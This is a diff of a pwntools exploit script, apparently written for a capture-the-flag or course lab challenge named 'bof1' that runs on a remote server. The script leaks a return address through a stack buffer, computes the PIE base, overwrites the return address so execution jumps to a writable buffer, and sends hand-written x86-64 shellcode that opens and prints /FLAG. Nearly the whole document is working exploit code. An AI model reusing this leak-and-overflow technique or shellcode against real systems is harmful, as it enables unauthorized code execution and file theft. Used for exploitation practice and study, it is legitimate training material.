@@ -3,51 +3,102 @@ from pwn import *
 context.binary = './bof1'
 elf = context.binary
 context.terminal = ['tmux', 'splitw', '-h']
-context.arch = 'amd64'
 
-# start the process with seccomp disabled
-p = process(elf.path, env={"NO_SANDBOX": "1"})
+# p = process()
+p = remote('up.zoolab.org', 12342)
 
-# Step 1: Send payload to leak return address (only 1 chance!)
-leak_payload = b'A' * 56
-p.sendafter("name? ", leak_payload)
 
-# Step 2: Receive leaked return address
-leaked = p.recvuntil(b"room number")
-leaked_ret = leaked.split(b'Welcome, ')[1][:8]
-print(f"leak ret: {leaked_ret}")
+# Step 1: Read banner
+banner = p.recvuntil(b"What's your name? ")
+print(repr(banner))
 
-ret_addr = u64(leaked_ret.ljust(8, b'\x00'))
+# Step 2: Leak return address via buf1
+payload1 = b"A" * 56
+p.send(payload1)
+
+# 接收 "Welcome, AAAAA..."\n"What's the room number?"
+response = p.recvuntil(b"What's the room number?")
+print(repr(response))
+
+# Extract ret address
+leak = response.split(b"Welcome, ")[-1][56:56+6] + b"\x00\x00"
+ret_addr = u64(leak)
 log.success(f"Leaked return address: {hex(ret_addr)}")
 
-# Step 3: Compute PIE base and msg address
-task_ret_offset = 313  # from GDB: task+313 is return
-base_addr = ret_addr - task_ret_offset
-msg_offset = 0xea7a7   # from: lea rax, [rip + 0xe5670] = offset to msg
+# Step 3: Compute base and msg address
+main_offset = elf.symbols['main']
+msg_offset = elf.symbols['msg']
+main_addr = ret_addr - 198
+base_addr = main_addr - main_offset
 msg_addr = base_addr + msg_offset
-log.info(f"PIE base address: {hex(base_addr)}")
-log.info(f"msg address: {hex(msg_addr)}")
+log.success(f"Main address: {hex(main_addr)}")
+log.success(f"Base address: {hex(base_addr)}")
+log.success(f"msg address:  {hex(msg_addr)}")
 
-# Step 4: Fill dummy data for buf2 and buf3
-p.sendafter("room number? ", b'B\n')
-p.sendafter("customer's name? ", b'C\n')
+# Step 4: Send buf2 (overwrite return address)
+payload2 = b"B" * 104 + p64(msg_addr)
+p.send(payload2)
 
-# Step 5: Send shellcode into RWX msg buffer
-shellcode = asm(shellcraft.open("/FLAG"))
-shellcode += asm(shellcraft.read(3, 'rsp', 100))
-shellcode += asm(shellcraft.write(1, 'rsp', 100))
+# print(f"[+] Attach to PID: {p.pid}")
+# pause()  # <<<<<<<<<<<<<< 這邊最合適！
 
-p.sendafter("Leave your message: ", shellcode)
+# Read next prompt
+prompt3 = p.recvuntil(b"customer's name? ")
+print(repr(prompt3))
 
-# (task will return here, and jump to the overwritten return address)
+# Step 5: Dummy buf3
+p.send(b"C" * 8)
 
-# Step 6: Now overwrite RIP (already done above)
-# Why this works: we sent it early via buf1, the only overflow point
-overflow_payload = b'A' * 56 + p64(msg_addr)
-# Re-execute the binary with the overflow payload preloaded
-# We do this by restarting the process and sending the full exploit
-# But since we already sent it in the first input, no need to send again
+# Read next prompt
+prompt4 = p.recvuntil(b"Leave your message: ")
+print(repr(prompt4))
 
-# Get flag output
+# Step 6: Send shellcode
+shellcode = asm("""
+    /* openat */
+    mov rax, 257
+    mov rdi, -100
+    lea rsi, [rip + path]
+    xor rdx, rdx
+    syscall
+
+    mov rdi, rax
+    lea rsi, [rsp + 100]
+    mov edx, 64
+    xor eax, eax
+    syscall
+
+    mov rdi, 1
+    mov rax, 1
+    syscall
+
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+
+path:
+""") + b"/FLAG\x00"
+
+
+
+# 這邊先 pause，讓 GDB 可以看到 msg 內容還是空的
+log.info("Ready to send shellcode")
+# pause()
+
+
+p.send(shellcode)
+
+log.info("Shellcode sent, check msg")
+# pause()
+
+
+# Receive final message (e.g., Thank you!)
+try:
+    final = p.recvline(timeout=1)
+    print(final.decode(errors="ignore"))
+
+except:
+    print("[!] No final response (maybe jumped to shellcode)")
+
+# Switch to interactive mode (to see FLAG if printed)
 p.interactive()
-
